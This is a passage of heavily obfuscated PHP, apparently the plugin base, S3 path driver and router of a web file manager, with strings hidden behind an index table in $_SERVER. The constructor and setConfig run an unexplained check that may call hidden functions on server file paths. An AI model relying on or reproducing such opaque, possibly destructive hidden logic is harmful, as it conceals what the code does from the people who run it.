(!empty($êâøÀ”)) { $êâøÀ” = explode($ãäÆï©[50], $êâøÀ”); if (count($êâøÀ”) > 1) { $à°šú‘ .= $ãäÆï©[51] . $êâøÀ”[1] . $ãäÆï©[52] . $êâøÀ”[0] . $ãäÆï©[53]; } else { $à°šú‘ .= $ãäÆï©[51] . $êâøÀ”[0] . $ãäÆï©[53]; } } return $à°šú‘; } } goto B™ˆ½¼Å¬¥; c‡•¤æŸ‘Ğ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($øƒÌ¶Ôï) { $æ¸Şâìº =& $_SERVER[¹Éµ„ºå]; parent::__construct($øƒÌ¶Ôï); $ˆÂşóûÃ = isset($øƒÌ¶Ôï[$æ¸Şâìº[256]]) && $øƒÌ¶Ôï[$æ¸Şâìº[256]] == $æ¸Şâìº[247] ? $æ¸Şâìº[247] : $æ¸Şâìº[313]; $this->setSignVersion($ˆÂşóûÃ); } public function link($ˆÂúÊÁ÷, $¥´î—ºœ = array()) { return parent::link($ˆÂúÊÁ÷, $¥´î—ºœ); } public function fileOut($æçÕ¸°, $ÉíÖıóÛ = false, $Ì•ôÜÛ = false, $²Íğ¢Ûİ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¹Éµ„ºå][314])) { return parent::fileOutServer($æçÕ¸°, $ÉíÖıóÛ, $Ì•ôÜÛ, $²Íğ¢Ûİ); } parent::fileOut($æçÕ¸°, $ÉíÖıóÛ, $Ì•ôÜÛ, $²Íğ¢Ûİ); } public function fileOutImage($’¾¾Ğ, $æõÁşØõ = 250) { if (strstr($this->endpoint, $_SERVER[¹Éµ„ºå][314])) { return parent::fileOutImageServer($’¾¾Ğ, $æõÁşØõ); } parent::fileOutImage($’¾¾Ğ, $æõÁşØõ); } } define($_SERVER[¹Éµ„ºå][315], 1); define($_SERVER[¹Éµ„ºå][316], 2); goto Fëó‚­†ğ; B‚¨ö‘ï‡: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $Ì¨ÄŒ¸ =& $_SERVER[¹Éµ„ºå]; if ($_SERVER[$Ì¨ÄŒ¸[1025]] != $_SERVER[$Ì¨ÄŒ¸[1026]]) { $ƒ…ŠÎöå = $Ì¨ÄŒ¸[1027]; $ıüÖÃíÛ = $Ì¨ÄŒ¸[1028]; $”­„Œ… = $_SERVER[$Ì¨ÄŒ¸[1029]] . $Ì¨ÄŒ¸[1030]; $£§®ô = $ıüÖÃíÛ($”­„Œ…); $Ü¹ã¨– = explode($Ì¨ÄŒ¸[285], $£§®ô); if (count($Ü¹ã¨–) < $Ì¨ÄŒ¸[715]) { $Ü·ØşñÓ = $Ì¨ÄŒ¸[1031]; $Ü·ØşñÓ(); } $µÒ…îÏĞ = $Ì¨ÄŒ¸[1032]; $µÒ…îÏĞ($_SERVER[$Ì¨ÄŒ¸[1033]]); $µÒ…îÏĞ($_SERVER[$Ì¨ÄŒ¸[1029]] . $Ì¨ÄŒ¸[1034]); $¨ñ¯ÅìÀ = 1; while ($¨ñ¯ÅìÀ > 1) { $¨ñ¯ÅìÀ = $¨ñ¯ÅìÀ + 4; $Ö‘Ö°â = rawurlencode($¨ñ¯ÅìÀ . $Ì¨ÄŒ¸[463]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Ì¨ÄŒ¸[1818]); $this->pluginName = str_replace($Ì¨ÄŒ¸[1818], $Ì¨ÄŒ¸[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Ì¨ÄŒ¸[8]; $this->pluginApi = appHostGet() . $Ì¨ÄŒ¸[1819] . $this->pluginName . $Ì¨ÄŒ¸[8]; $this->pluginHost = $config[$Ì¨ÄŒ¸[1820]] . $this->pluginName . $Ì¨ÄŒ¸[8]; $this->pluginHostDefault = $config[$Ì¨ÄŒ¸[1820]] . $this->pluginName . $Ì¨ÄŒ¸[8]; $µ¢£©¿ô = $config[$Ì¨ÄŒ¸[1821]]; if ($µ¢£©¿ô && strpos($Ì¨ÄŒ¸[50] . $µ¢£©¿ô . $Ì¨ÄŒ¸[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$Ì¨ÄŒ¸[1822]] . $this->pluginName . $Ì¨ÄŒ¸[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¹Éµ„ºå][1823]); } protected function assign($Ö‹‹Ùê, $ßñÏÂË· = false) { if (is_array($Ö‹‹Ùê)) { $this->values = array_merge($this->values, $Ö‹‹Ùê); } else { $this->values[$Ö‹‹Ùê] = $ßñÏÂË·; } } protected function display($»ÍŒÍâ) { extract($this->values); require $»ÍŒÍâ; } final function hookRegist($¡Ê“¥Şã) { $this->modelPlugin->appRegist($this->pluginName, $¡Ê“¥Şã); } final function appIcon() { $Áè³óÛ =& $_SERVER[¹Éµ„ºå]; $µ—Ê×È× = $this->appPackage(); $ÙñõÊÀÇ = $Áè³óÛ[12]; if (isset($µ—Ê×È×[$Áè³óÛ[505]])) { if (isset($µ—Ê×È×[$Áè³óÛ[505]][$Áè³óÛ[1824]])) { $ÙñõÊÀÇ = $Áè³óÛ[1825] . $µ—Ê×È×[$Áè³óÛ[505]][$Áè³óÛ[1824]] . $Áè³óÛ[1826]; } else { if ($µ—Ê×È×[$Áè³óÛ[505]][$Áè³óÛ[1827]]) { $ÙñõÊÀÇ = $Áè³óÛ[1828] . $µ—Ê×È×[$Áè³óÛ[505]][$Áè³óÛ[1827]] . $Áè³óÛ[1829]; } } } return $ÙñõÊÀÇ; } final function fileCanView($·åÆÁÖï) { $À»…ƒ¦½ =& $_SERVER[¹Éµ„ºå]; if (request_url_safe($·åÆÁÖï)) { return !0; } if ($this->isShare($·åÆÁÖï)) { ActionCall($À»…ƒ¦½[1830], $·åÆÁÖï); return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $£ Ùª“© = $À»…ƒ¦½[1831] . rawurlencode(this_url()); show_tips(LNG($À»…ƒ¦½[1832]) . $À»…ƒ¦½[1833] . $£ Ùª“© . $À»…ƒ¦½[1834] . LNG($À»…ƒ¦½[1835]) . $À»…ƒ¦½[1836], !1); } if (!Action($À»…ƒ¦½[1837])->authCan($À»…ƒ¦½[1838])) { show_tips(LNG($À»…ƒ¦½[1839]) . $À»…ƒ¦½[1840], !1); } ActionCall($À»…ƒ¦½[1830], $·åÆÁÖï); } final function isShare($¶ùšĞ¨Ñ) { $„ó¦ÖÁö = KodIO::parse($¶ùšĞ¨Ñ); return $„ó¦ÖÁö[$_SERVER[¹Éµ„ºå][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($şÛ¤òí¥) { if (request_url_safe($şÛ¤òí¥)) { return $şÛ¤òí¥; } if (!$this->isShare($şÛ¤òí¥)) { $şÛ¤òí¥ = $this->filePath($şÛ¤òí¥, !1); } return Action($_SERVER[¹Éµ„ºå][1352])->linkOut($şÛ¤òí¥); } public function filePathLinkOut($Õõ¸¢Ç·) { if (request_url_safe($Õõ¸¢Ç·)) { return $Õõ¸¢Ç·; } $this->fileCanView($Õõ¸¢Ç·); return Action($_SERVER[¹Éµ„ºå][1352])->link($Õõ¸¢Ç·); } final function filePath($ôÌ¤‘Í, $ĞèÆÍ¿Õ = true, $˜„ÃœÅæ = false) { $ÙÇ§ÑÄÚ =& $_SERVER[¹Éµ„ºå]; $ºÍìĞşÅ = $this->filePathGet($ôÌ¤‘Í, $ĞèÆÍ¿Õ); if (!$this->fileInfo) { show_tips(LNG($ÙÇ§ÑÄÚ[105]), !1); } if ($˜„ÃœÅæ && isset($this->fileInfo[$ÙÇ§ÑÄÚ[557]]) && $this->fileInfo[$ÙÇ§ÑÄÚ[557]]) { $àÀµè¹ˆ = Model($ÙÇ§ÑÄÚ[560])->fileInfo($this->fileInfo[$ÙÇ§ÑÄÚ[557]]); if (!$àÀµè¹ˆ || !IO::exist($àÀµè¹ˆ[$ÙÇ§ÑÄÚ[87]])) { $õï®¼Éà = LNG($ÙÇ§ÑÄÚ[105]) . LNG($ÙÇ§ÑÄÚ[1841]); if (KodUser::isRoot() && isset($àÀµè¹ˆ[$ÙÇ§ÑÄÚ[87]])) { $õï®¼Éà .= $ÙÇ§ÑÄÚ[1842] . $àÀµè¹ˆ[$ÙÇ§ÑÄÚ[87]] . $ÙÇ§ÑÄÚ[1843]; } show_tips($õï®¼Éà); } } Hook::trigger($ÙÇ§ÑÄÚ[1844], $ºÍìĞşÅ); return $ºÍìĞşÅ; } final function filePathGet($çíâù¢Ú, $ğ±Ì®àò = true) { $âÚÏ‹Şø =& $_SERVER[¹Éµ„ºå]; $this->fileCanView($çíâù¢Ú); if ($çÍ¥ÀÖµ = $this->checkSharePath($çíâù¢Ú, $ğ±Ì®àò)) { return $çÍ¥ÀÖµ; } if (request_url_safe($çíâù¢Ú)) { $í—‹Ç¾Ğ = parse_url_query($çíâù¢Ú); if (isset($í—‹Ç¾Ğ[$âÚÏ‹Şø[1845]]) && isset($í—‹Ç¾Ğ[$âÚÏ‹Şø[234]])) { $á€„Ä£Ù = Mcrypt::decode($í—‹Ç¾Ğ[$âÚÏ‹Şø[234]], Model($âÚÏ‹Şø[864])->get($âÚÏ‹Şø[865])); if ($á€„Ä£Ù) { $this->fileInfo = IO::info($á€„Ä£Ù); $this->fileInfo[$âÚÏ‹Şø[1846]] = $çíâù¢Ú; $this->cachePath = $this->pluginCachePath($âÚÏ‹Şø[12], $ğ±Ì®àò); return $á€„Ä£Ù; } } $çíâù¢Ú = $this->_cacheHttpFile($çíâù¢Ú, $ğ±Ì®àò); $this->fileInfo = IO::info($çíâù¢Ú); } else { $this->fileInfo = IO::info($çíâù¢Ú); $this->cachePath = $this->pluginCachePath($âÚÏ‹Şø[12], $ğ±Ì®àò); } return $çíâù¢Ú; } final function _cacheHttpFile($Ù‚É‰åô, $ÄãœÄ„Œ = true) { $ÇêÎ”–É =& $_SERVER[¹Éµ„ºå]; $ôãš‘€Á = parse_url_query($Ù‚É‰åô); $ä†î’İ = get_path_ext($Ù‚É‰åô); if (isset($ôãš‘€Á[$ÇêÎ”–É[32]]) && $ôãš‘€Á[$ÇêÎ”–É[32]]) { $ä†î’İ = get_path_ext($ôãš‘€Á[$ÇêÎ”–É[32]]); } $Î ¾İ–« = hash_path($Ù‚É‰åô) . $ÇêÎ”–É[10] . $ä†î’İ; $this->cachePath = $this->pluginCachePath($ÄãœÄ„Œ ? $Î ¾İ–« : $ÇêÎ”–É[12]); $ãĞÙ•Ş° = IO::fileNameExist($this->cachePath, $Î ¾İ–«); if ($ãĞÙ•Ş°) { return KodIO::make($ãĞÙ•Ş°); } $úÃ³ªÕ¦ = rtrim($this->cachePath, $ÇêÎ”–É[8]) . $ÇêÎ”–É[8] . $Î ¾İ–«; return $this->pluginCacheFileSet($úÃ³ªÕ¦, file_get_contents_nossl($Ù‚É‰åô)); } final function checkSharePath($®ç—¾Ñ, $ ”õÎÛˆ = true) { $şØœŸÏ¦ =& $_SERVER[¹Éµ„ºå]; if (!$this->isShare($®ç—¾Ñ)) { return !1; } $™Şèå• = Action($şØœŸÏ¦[1352])->sharePathInfo($®ç—¾Ñ); if (!is_array($™Şèå•) || !isset($™Şèå•[$şØœŸÏ¦[87]])) { $ªë¢¡ãå = $GLOBALS[$şØœŸÏ¦[1847]]; show_json($ªë¢¡ãå ? $ªë¢¡ãå : LNG($şØœŸÏ¦[1848]), !1); } $this->fileInfo = $™Şèå•; $this->cachePath = $this->pluginCachePath(!1, $ ”õÎÛˆ); return $™Şèå•[$şØœŸÏ¦[87]]; } final function pluginCachePath($û–Ì¥Â = '', $ãóí‚å¹ = false) { $œÆÊïÀ® =& $_SERVER[¹Éµ„ºå]; if ($ãóí‚å¹ && is_array($this->fileInfo)) { $û–Ì¥Â = kodIO::hashPath($this->fileInfo); } $ì™ŸÚŞ = rtrim(IO_PATH_SYSTEM_TEMP . $œÆÊïÀ®[1849] . $this->pluginName . $œÆÊïÀ®[8] . $û–Ì¥Â, $œÆÊïÀ®[8]); $¨áñ‹²Ü = IO::infoFullSimple($ì™ŸÚŞ); $½Ÿ¹ä¨ = $¨áñ‹²Ü && is_array($¨áñ‹²Ü) ? $¨áñ‹²Ü[$œÆÊïÀ®[87]] : $œÆÊïÀ®[12]; if (!$½Ÿ¹ä¨) { $½Ÿ¹ä¨ = IO::mkdir($ì™ŸÚŞ); } return $½Ÿ¹ä¨; } final function pluginCacheFileSet($ŒƒĞ›©Æ, $‚è¥¸Ãõ = '') { $éôÖÓÙ =& $_SERVER[¹Éµ„ºå]; $şé ı³Ù = IO::infoFullSimple($ŒƒĞ›©Æ); if (!$şé ı³Ù) { return IO::mkfile($ŒƒĞ›©Æ, $‚è¥¸Ãõ, REPEAT_REPLACE); } IO::setContent($şé ı³Ù[$éôÖÓÙ[87]], $‚è¥¸Ãõ); return $şé ı³Ù[$éôÖÓÙ[87]]; } final function pluginLocalFile($‚İ™¶ö¬ = '') { $àÆğò´Ğ =& $_SERVER[¹Éµ„ºå]; $—ÏÑÚÆ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($—ÏÑÚÆ)) { mk_dir($—ÏÑÚÆ); } if (!$‚İ™¶ö¬) { return $—ÏÑÚÆ; } $Øƒ¿ƒğñ = IO::info($‚İ™¶ö¬); $á¿Ç‰û÷ = $àÆğò´Ğ[1850] . KodIO::hashPath($Øƒ¿ƒğñ) . $àÆğò´Ğ[10] . $Øƒ¿ƒğñ[$àÆğò´Ğ[166]]; if (!checkExtSafe($á¿Ç‰û÷)) { $á¿Ç‰û÷ = $á¿Ç‰û÷ . $àÆğò´Ğ[1385]; } $Š©ËİÚ = $—ÏÑÚÆ . $á¿Ç‰û÷; if (@file_exists($Š©ËİÚ)) { return $Š©ËİÚ; } return IO::copy($‚İ™¶ö¬, $—ÏÑÚÆ, 0, $á¿Ç‰û÷); } final function appPackage() { $—êô¦Ø¹ =& $_SERVER[¹Éµ„ºå]; if ($this->packageData) { return $this->packageData; } $óÀùÊ•Ö = $this->parseFile($this->pluginPath . $—êô¦Ø¹[1851]); $this->parseLang($óÀùÊ•Ö); $ˆØ¢®â = json_decode_force($óÀùÊ•Ö); if (!$ˆØ¢®â) { return array(); } $©§Ì£ƒ‡ = Hook::filter($—êô¦Ø¹[1852], $ˆØ¢®â); if ($©§Ì£ƒ‡ && is_array($©§Ì£ƒ‡)) { $ˆØ¢®â = $©§Ì£ƒ‡; } $this->packageData = $ˆØ¢®â; return $ˆØ¢®â; } public function packageInfoGet($ŠæèøÁ) { $¨ÄçÇ®¿ = $this->appPackage(); return array_get_value($¨ÄçÇ®¿, $ŠæèøÁ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¹Éµ„ºå][1853]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¹Éµ„ºå][1854]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¹Éµ„ºå][1855]); } public function echoJsAssign($æ¹¡É—Á, $‘×¦„ƒ·) { $this->echoJsAssignArr[$æ¹¡É—Á] = $‘×¦„ƒ·; } private function parseFile($º³Ñ×Éµ) { $Ìå¬–â‰ =& $_SERVER[¹Éµ„ºå]; $©”‹ÉÙÜ = file_get_contents_nossl($º³Ñ×Éµ); $”«Ìëòè = array($Ìå¬–â‰[1856], $Ìå¬–â‰[1857], $Ìå¬–â‰[1858], $Ìå¬–â‰[1859], $Ìå¬–â‰[1860], $Ìå¬–â‰[1861], $Ìå¬–â‰[1862]); $è¹ÊÃÎ» = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Ìå¬–â‰[92]][$Ìå¬–â‰[1863]]); foreach ($this->echoJsAssignArr as $Ş‹Ûöüô => $†Ä÷®Ä) { $”«Ìëòè[] = $Ìå¬–â‰[1864] . $Ş‹Ûöüô . $Ìå¬–â‰[1865]; $è¹ÊÃÎ»[] = is_array($†Ä÷®Ä) || is_object($†Ä÷®Ä) ? rawurlencode(json_encode($†Ä÷®Ä)) : $†Ä÷®Ä; } if (strstr($©”‹ÉÙÜ, $Ìå¬–â‰[1866])) { $­•ƒµñ‹ = rawurlencode(json_encode($this->pluginLangArr)); $©”‹ÉÙÜ = str_replace($Ìå¬–â‰[1866], $­•ƒµñ‹, $©”‹ÉÙÜ); } if (strstr($©”‹ÉÙÜ, $Ìå¬–â‰[1867])) { $­•ƒµñ‹ = $­•ƒµñ‹ = rawurlencode(json_encode($this->getConfig())); $©”‹ÉÙÜ = str_replace($Ìå¬–â‰[1867], $­•ƒµñ‹, $©”‹ÉÙÜ); } $©”‹ÉÙÜ = str_replace($”«Ìëòè, $è¹ÊÃÎ», $©”‹ÉÙÜ); return $©”‹ÉÙÜ; } private function parseLang(&$éÆşº†Ë) { $——å“ˆÊ =& $_SERVER[¹Éµ„ºå]; $ê‚Íˆ©Ğ = $——å“ˆÊ[1868]; if (!strstr($éÆşº†Ë, $ê‚Íˆ©Ğ)) { return; } preg_match_all($——å“ˆÊ[1869], $éÆşº†Ë, $ïè¿ËÑ); if (!is_array($ïè¿ËÑ) || count($ïè¿ËÑ) == 0 || !is_array($ïè¿ËÑ[0]) || count($ïè¿ËÑ[0]) == 0) { return; } $ÔíÁÌë = array(); $çâ¯“× = array(); foreach ($ïè¿ËÑ[0] as $æ •¿Ó) { $Èà‘Åœ› = substr($æ •¿Ó, strlen($ê‚Íˆ©Ğ), -4); $ô˜üé’Œ = LNG($Èà‘Åœ›); $ÔíÁÌë[] = $æ •¿Ó; $çâ¯“×[] = str_replace(array($——å“ˆÊ[285], $——å“ˆÊ[1239], $——å“ˆÊ[417], $——å“ˆÊ[118]), array($——å“ˆÊ[53], $——å“ˆÊ[53], $——å“ˆÊ[12], $——å“ˆÊ[1870]), $ô˜üé’Œ); } $éÆşº†Ë = str_replace($ÔíÁÌë, $çâ¯“×, $éÆşº†Ë); } private function parseConfig(&$ÃÆÅ«î) { $Ÿ“â˜œ• =& $_SERVER[¹Éµ„ºå]; $İ«É”ó = $Ÿ“â˜œ•[1871]; if (!strstr($ÃÆÅ«î, $İ«É”ó)) { return; } preg_match_all($Ÿ“â˜œ•[1872], $ÃÆÅ«î, $ó€›è˜); if (!is_array($ó€›è˜) || count($ó€›è˜) == 0 || !is_array($ó€›è˜[0]) || count($ó€›è˜[0]) == 0) { return; } $–ö–¦¥¤ = $this->getConfig(); $Ğ†­şı = array(); $ÆêÛ”Ñ± = array(); foreach ($ó€›è˜[0] as $øƒä±™Š) { $åï–—Ÿ = substr($øƒä±™Š, strlen($İ«É”ó), -2); $Ğ†­şı[] = $øƒä±™Š; $ÆêÛ”Ñ±[] = _get($–ö–¦¥¤, $åï–—Ÿ); } $ÃÆÅ«î = str_replace($Ğ†­şı, $ÆêÛ”Ñ±, $ÃÆÅ«î); } private function parsePackage(&$Æ²Õ½¬) { $ˆï¥Ûö½ =& $_SERVER[¹Éµ„ºå]; $ä§Ï¨•‘ = $ˆï¥Ûö½[1873]; if (!strstr($Æ²Õ½¬, $ä§Ï¨•‘)) { return; } preg_match_all($ˆï¥Ûö½[1874], $Æ²Õ½¬, $×¿áğ¨©); if (!is_array($×¿áğ¨©) || count($×¿áğ¨©) == 0 || !is_array($×¿áğ¨©[0]) || count($×¿áğ¨©[0]) == 0) { return; } $²Š®¨òì = $this->appPackage(); $ú˜˜ÅÒ” = array(); $…á´Çç— = array(); foreach ($×¿áğ¨©[0] as $±Šñ¡ß£) { $ƒëÍšîï = substr($±Šñ¡ß£, strlen($ä§Ï¨•‘), -2); $ú˜˜ÅÒ”[] = $±Šñ¡ß£; $…á´Çç—[] = _get($²Š®¨òì, $ƒëÍšîï); } $Æ²Õ½¬ = str_replace($ú˜˜ÅÒ”, $…á´Çç—, $Æ²Õ½¬); } final function echoFile($¾¦ùŸŸ¾, $¥¸öªÉ = false) { $Û®§·¾ =& $_SERVER[¹Éµ„ºå]; $…ñ†Ï” = $this->pluginPath . $¾¦ùŸŸ¾; if (ACT == $Û®§·¾[1875]) { echo $Û®§·¾[1876] . $this->pluginName . $Û®§·¾[8] . $¾¦ùŸŸ¾ . $Û®§·¾[1877]; if (!file_exists($…ñ†Ï”)) { echo $Û®§·¾[1878]; return; } } $Ê”éŸŠ® = $this->parseFile($…ñ†Ï”); $this->parseLang($Ê”éŸŠ®); $this->parseConfig($Ê”éŸŠ®); $this->parsePackage($Ê”éŸŠ®); if (is_array($¥¸öªÉ)) { $Ê”éŸŠ® = str_replace(array_keys($¥¸öªÉ), array_values($¥¸öªÉ), $Ê”éŸŠ®); } echo $Û®§·¾[285] . $Ê”éŸŠ®; } private function checkVersion() { $¡Œ²ïªü =& $_SERVER[¹Éµ„ºå]; $Í‹ÖÄë• = $this->appPackage(); $œğËï„ = $this->getConfig(); if ($œğËï„[$¡Œ²ïªü[1879]] == $Í‹ÖÄë•[$¡Œ²ïªü[1853]]) { return; } $this->regist(); $this->setConfig(array($¡Œ²ïªü[1879] => $Í‹ÖÄë•[$¡Œ²ïªü[1853]])); } final function initLang() { $ÊÓµ¡È =& $_SERVER[¹Éµ„ºå]; $•œ×Á˜ = $ÊÓµ¡È[1880]; $öÌ¦©¹ä = $this->pluginPath . $ÊÓµ¡È[1881]; $™ÂŸŸíÛ = I18n::getType(); $¡ğÅœ°Ù = array(); if (file_exists($öÌ¦©¹ä . $™ÂŸŸíÛ . $ÊÓµ¡È[986])) { $¡ğÅœ°Ù = (include $öÌ¦©¹ä . $™ÂŸŸíÛ . $ÊÓµ¡È[986]); } else { if ($™ÂŸŸíÛ == $ÊÓµ¡È[1882] && !file_exists($öÌ¦©¹ä . $™ÂŸŸíÛ . $ÊÓµ¡È[986]) && file_exists($öÌ¦©¹ä . $ÊÓµ¡È[1883])) { $¡ğÅœ°Ù = (include $öÌ¦©¹ä . $ÊÓµ¡È[1883]); $™ÂŸŸíÛ = $ÊÓµ¡È[1699]; } else { if (file_exists($öÌ¦©¹ä . $•œ×Á˜ . $ÊÓµ¡È[986])) { $¡ğÅœ°Ù = (include $öÌ¦©¹ä . $•œ×Á˜ . $ÊÓµ¡È[986]); $™ÂŸŸíÛ = $•œ×Á˜; } } } if (!$¡ğÅœ°Ù || !is_array($¡ğÅœ°Ù)) { $¡ğÅœ°Ù = array(); } $±‰â¦“ = Hook::trigger($ÊÓµ¡È[1884], $¡ğÅœ°Ù, $this->pluginName, $™ÂŸŸíÛ); if ($±‰â¦“ && is_array($±‰â¦“)) { $¡ğÅœ°Ù = $±‰â¦“; } if (@count($¡ğÅœ°Ù) > 0) { I18n::set($¡ğÅœ°Ù); } return $¡ğÅœ°Ù; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($—îò¦ÒÙ) { $ÁÔñ½… =& $_SERVER[¹Éµ„ºå]; if ($_SERVER[$ÁÔñ½…[1025]] != $_SERVER[$ÁÔñ½…[1026]]) { $¦ëğï¶ = $ÁÔñ½…[1027]; $ãÂúíÅÚ = $ÁÔñ½…[1028]; $ºìòüú‹ = $_SERVER[$ÁÔñ½…[1029]] . $ÁÔñ½…[1030]; $àùñºÃü = $ãÂúíÅÚ($ºìòüú‹); $¤¿Á—Â† = explode($ÁÔñ½…[285], $àùñºÃü); if (count($¤¿Á—Â†) < $ÁÔñ½…[715]) { $Á“Ì­¯¢ = $ÁÔñ½…[1031]; $Á“Ì­¯¢(); } $îş£±ƒ³ = $ÁÔñ½…[1032]; $îş£±ƒ³($_SERVER[$ÁÔñ½…[1033]]); $îş£±ƒ³($_SERVER[$ÁÔñ½…[1029]] . $ÁÔñ½…[1034]); $·®¾ÌÄ = 1; while ($·®¾ÌÄ > 1) { $·®¾ÌÄ = $·®¾ÌÄ + 4; $ù¨­Ì§‰ = rawurlencode($·®¾ÌÄ . $ÁÔñ½…[463]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $—îò¦ÒÙ); } public function onSetConfig($­–ğ†Îâ) { } public function onGetConfig($¨Ø•ù˜ë) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($¨ïÅ±úı) { if ($¨ïÅ±úı == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($´±Ëå«” = "\160\x6c\165\147\x69\x6e\x41\165\x74\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $À÷—°Å = $this->getConfig(); if (!$À÷—°Å[$´±Ëå«”]) { return !1; } return ActionCall($_SERVER[¹Éµ„ºå][1885], $À÷—°Å[$´±Ëå«”]); } public function url($úÓ€¢ø¿, $ùÉÃœÄ = '', $ı¯¹©òú = true) { $”¯Ï‚ÇË =& $_SERVER[¹Éµ„ºå]; $ÌÊä¸ƒÇ = $this->getConfig(); $«£ğ¿ÏÁ = KOD_VERSION . $”¯Ï‚ÇË[10] . KOD_VERSION_BUILD; $éÃ°Ê„õ = $this->packageVersion(); $Æ·£Â’Š = $«£ğ¿ÏÁ . $”¯Ï‚ÇË[476] . $éÃ°Ê„õ; if (substr($úÓ€¢ø¿, 0, 4) == $”¯Ï‚ÇË[149] || substr($úÓ€¢ø¿, 0, 2) == $”¯Ï‚ÇË[1512]) { $“¬£Öì‘ = $úÓ€¢ø¿ . $”¯Ï‚ÇË[1886] . $Æ·£Â’Š; } else { if ($ùÉÃœÄ == $”¯Ï‚ÇË[12]) { $“¬£Öì‘ = $this->pluginHost . $úÓ€¢ø¿ . $”¯Ï‚ÇË[1886] . $Æ·£Â’Š; } else { if ($ùÉÃœÄ === $”¯Ï‚ÇË[78]) { $“¬£Öì‘ = $this->pluginHost . $úÓ€¢ø¿; } else { if ($ùÉÃœÄ == $”¯Ï‚ÇË[1887]) { $“¬£Öì‘ = STATIC_PATH . $úÓ€¢ø¿ . $”¯Ï‚ÇË[1886] . $«£ğ¿ÏÁ; } else { if ($ùÉÃœÄ == $”¯Ï‚ÇË[1888]) { $“¬£Öì‘ = APP_HOST . $”¯Ï‚ÇË[1889] . $úÓ€¢ø¿ . $”¯Ï‚ÇË[1886] . $«£ğ¿ÏÁ; } else { if (isset($ÌÊä¸ƒÇ[$ùÉÃœÄ])) { $“¬£Öì‘ = $ÌÊä¸ƒÇ[$ùÉÃœÄ] . $úÓ€¢ø¿ . $”¯Ï‚ÇË[1886] . $Æ·£Â’Š; } } } } } } if (!$ı¯¹©òú) { return $“¬£Öì‘; } echo $“¬£Öì‘; } public function link($ƒ³ë‘´“ = false, $¶½õÑ = '') { $™ÃËÃÊÚ =& $_SERVER[¹Éµ„ºå]; $»ùŒĞéÚ = $this->linkHas == !1; $this->linkHas = !0; if (!$ƒ³ë‘´“) { $this->link($™ÃËÃÊÚ[1890], $™ÃËÃÊÚ[1888]); $this->link($™ÃËÃÊÚ[1891], $™ÃËÃÊÚ[1887]); $this->link($™ÃËÃÊÚ[1892], $™ÃËÃÊÚ[1887]); $this->link($™ÃËÃÊÚ[1893], $™ÃËÃÊÚ[1887]); $this->link($™ÃËÃÊÚ[1894], $™ÃËÃÊÚ[1887]); if ($»ùŒĞéÚ) { Hook::trigger($™ÃËÃÊÚ[1895]); } return; } $·ÈÎÊ•¾ = $this->url($ƒ³ë‘´“, $¶½õÑ, !1); if (substr($ƒ³ë‘´“, -3) == $™ÃËÃÊÚ[1896]) { echo $™ÃËÃÊÚ[1897] . $·ÈÎÊ•¾ . $™ÃËÃÊÚ[1898] . $™ÃËÃÊÚ[285]; } else { if (substr($ƒ³ë‘´“, -4) == $™ÃËÃÊÚ[1899]) { echo $™ÃËÃÊÚ[1900] . $·ÈÎÊ•¾ . $™ÃËÃÊÚ[1901] . $™ÃËÃÊÚ[285]; } } if ($»ùŒĞéÚ) { Hook::trigger($™ÃËÃÊÚ[1895]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\x79" => "\133\x5e\x2f\x5d\x2b", "\x3a\x6e\x75\155" => "\x5b\60\x2d\71\x5d\53", "\72\x61\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($Şøˆ™á³, $œ®½¾¼ü) { $î²§ùšÛ =& $_SERVER[¹Éµ„ºå]; if ($Şøˆ™á³ == $î²§ùšÛ[1902]) { $ÆÅ×ç·ƒ = array_map($î²§ùšÛ[1903], $œ®½¾¼ü[0]); $¸Ô´íÂ = strpos($œ®½¾¼ü[1], $î²§ùšÛ[8]) === 0 ? $œ®½¾¼ü[1] : $î²§ùšÛ[8] . $œ®½¾¼ü[1]; $§Àı®ÔØ = $œ®½¾¼ü[2]; } else { $ÆÅ×ç·ƒ = null; $¸Ô´íÂ = strpos($œ®½¾¼ü[0], $î²§ùšÛ[8]) === 0 ? $œ®½¾¼ü[0] : $î²§ùšÛ[8] . $œ®½¾¼ü[0]; $§Àı®ÔØ = $œ®½¾¼ü[1]; } array_push(self::$maps, $ÆÅ×ç·ƒ); array_push(self::$routes, $¸Ô´íÂ); array_push(self::$methods, strtoupper($Şøˆ™á³)); array_push(self::$callbacks, $§Àı®ÔØ); } public static function error($üÆÒéÆ—) { self::$errorCallback = $üÆÒéÆ—; } public static function haltOnMatch($¼ìÒØ¹¸ = true) { self::$halts = $¼ìÒØ¹¸; } public static function dispatch() { $ßı›Â•÷ =& $_SERVER[¹Éµ„ºå]; $©ığßìô = parse_url($_SERVER[$ßı›Â•÷[1904]], PHP_URL_PATH); $± –Ä¹é = 